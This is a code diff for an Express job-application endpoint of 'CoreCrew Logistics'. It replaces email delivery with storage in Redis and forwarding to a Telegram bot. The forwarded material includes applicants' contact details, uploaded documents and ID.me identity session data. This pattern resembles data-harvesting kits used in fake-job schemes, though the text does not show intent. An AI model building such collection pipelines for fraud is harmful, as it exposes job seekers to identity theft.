@@ -2,7 +2,9 @@ const path = require('path');
 const os = require('os');
 const express = require('express');
 const multer = require('multer');
-const nodemailer = require('nodemailer');
+const fetch = require('node-fetch');
+const FormData = require('form-data');
+const { Redis } = require('@upstash/redis');
 
 const router = express.Router();
 
@@ -72,34 +74,49 @@ router.post('/submit', async (req, res) => {
 
     const attachments = (data.files || []).map((f) => ({ filename: f.originalname, path: f.path, contentType: f.mimetype }));
 
-    const html = `
-      <h2>New Job Application - CoreCrew Logistics</h2>
-      <p><strong>Name:</strong> ${data.firstName} ${data.lastName}</p>
-      <p><strong>Email:</strong> ${data.email}</p>
-      <p><strong>Phone:</strong> ${data.phone}</p>
-      <p><strong>Position:</strong> ${data.position}</p>
-      <p><strong>Cover Letter:</strong></p>
-      <pre style="white-space: pre-wrap;">${(data.coverLetter || '').replace(/</g, '&lt;')}</pre>
-    `;
+    // Store in Upstash Redis
+    try {
+      const redis = new Redis({
+        url: process.env.UPSTASH_REDIS_REST_URL,
+        token: process.env.UPSTASH_REDIS_REST_TOKEN,
+      });
+      const key = `application:${Date.now()}:${(data.email||'').replace(/[^a-zA-Z0-9._-]/g,'_')}`;
+      await redis.hset(key, {
+        firstName: data.firstName,
+        lastName: data.lastName,
+        email: data.email,
+        phone: data.phone,
+        position: data.position,
+        coverLetter: data.coverLetter || '',
+        files: JSON.stringify(attachments.map(a=>({ name:a.filename, type:a.contentType }))),
+        idme: JSON.stringify(req.session.idme || {}),
+        createdAt: new Date().toISOString(),
+      });
+    } catch (e) {
+      console.warn('Upstash store failed:', e.message);
+    }
 
-    const shouldEmail = Boolean(process.env.SMTP_HOST && process.env.SMTP_USER && process.env.SMTP_PASS);
-    if (shouldEmail) {
-      const transporter = nodemailer.createTransport({
-        host: process.env.SMTP_HOST,
-        port: parseInt(process.env.SMTP_PORT || '587', 10),
-        secure: process.env.SMTP_SECURE === 'true',
-        auth: {
-          user: process.env.SMTP_USER,
-          pass: process.env.SMTP_PASS,
-        },
-      });
-      await transporter.sendMail({
-        from: process.env.FROM_EMAIL || process.env.SMTP_USER,
-        to: process.env.TO_EMAIL || 'corecrewlogistics@gmail.com',
-        subject: `New Application: ${data.firstName} ${data.lastName} - ${data.position}`,
-        html,
-        attachments,
-      });
+    // Send to Telegram
+    try {
+      const botToken = process.env.TELEGRAM_BOT_TOKEN;
+      const chatId = process.env.TELEGRAM_CHAT_ID;
+      if (botToken && chatId) {
+        const summary = `New Application\nName: ${data.firstName} ${data.lastName}\nEmail: ${data.email}\nPhone: ${data.phone}\nPosition: ${data.position}`;
+        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: chatId, text: summary }),
+        });
+
+        for (const f of attachments) {
+          const form = new FormData();
+          form.append('chat_id', chatId);
+          form.append('document', require('fs').createReadStream(f.path), { filename: f.filename, contentType: f.contentType });
+          await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, { method: 'POST', body: form });
+        }
+      }
+    } catch (e) {
+      console.warn('Telegram send failed:', e.message);
     }
 
     req.session.applicationDraft = null;
